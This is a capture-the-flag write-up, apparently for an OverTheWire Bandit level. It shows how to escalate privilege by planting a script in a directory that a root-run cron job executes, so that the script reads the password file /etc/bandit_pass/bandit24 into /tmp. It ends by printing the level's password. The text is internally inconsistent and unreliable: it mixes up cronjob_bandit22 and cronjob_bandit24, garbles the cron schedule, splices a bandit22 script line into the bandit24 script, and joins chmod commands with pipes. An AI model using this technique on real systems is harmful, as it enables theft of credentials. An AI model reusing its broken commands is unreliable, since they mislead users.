### A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

- **ls -l /etc/cron.d/** to list the files in the directory /etc/cron.d/. We get the result: cronjob_bandit22.

- **cat /etc/cron.d/cronjob_bandit24** to read the file cronjob_bandit22. We get the result: \
   `@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null`\
   `** *** bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null` \
  So, the program is running automatically /usr/bin/cronjob_bandit22.sh
  because we have \*\*\*\*\* in the second line.

- **cat /usr/bin/cronjob_bandit24.sh** to read the file /usr/bin/cronjob_bandit22.sh. We get the result: \
  `#!/bin/bash`\
  `myname=$(whoami)`\
  `cat /etc/bandit_pass/$myname > /tmp/$mytarget`\
  `cd /var/spool/$myname/foo`\
  `echo "Executing and deleting all scripts in /var/spool/$myname/foo:"`\
  `for i in * .*;`\
  `do`\
  `if [ "$i" != "." -a "$i" != ".." ];`\
  `then`\
  `echo "Handling $i"`\
  `owner="$(stat --format "%U" ./$i)"`\
  `if [ "${owner}" = "bandit23" ]; then`\
  `timeout -s 9 60 ./$i`\
  `fi`\
  `rm -f ./$i`\
  `fi`\
  `done`

It means. Executing and deleting all scripts in /var/spool/bandit24/foo: . So we need to create a script in /var/spool/bandit24/foo and get the password for the next level. So, we need to do the following steps:

- **mkdir /tmp/dangto** to make directory dangto in /tmp then **cd /tmp/dangto** to go to the directory dangto

- **touch password** to make a file to save the password

- **touch script.sh** to make a file to save the script

- **nano script.sh** to edit the file script.sh

Then we add this to script.sh:\
`#!/bin/bash`\
 `cat /etc/bandit_pass/bandit24 > /tmp/dangto/password`
then save\(CTRL+S) and exit\(CTRL+X). After that, we need to give full permissions by cmd: **chmod 777 /tmp/dangto | chmod 777 password | chmod 777 script.sh**. Then we need to copy the file bandit24.sh to /var/spool/bandit24/foo by cmd: **cp script.sh /var/spool/bandit24/foo/script.sh** for it execute by cronjob_bandit24. Then we **cat password** to read the file and get the password for the next level

### Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
